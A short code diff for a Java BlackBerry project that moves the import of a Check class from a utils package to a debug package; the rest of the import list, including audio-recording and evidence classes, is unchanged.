@@ -15,13 +15,13 @@ import net.rim.device.api.util.DataBuffer;
 import blackberry.AgentManager;
 import blackberry.Status;
 import blackberry.config.Conf;
+import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
 import blackberry.evidence.EvidenceType;
 import blackberry.fs.Path;
 import blackberry.record.AudioRecorder;
-import blackberry.utils.Check;
 import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
 
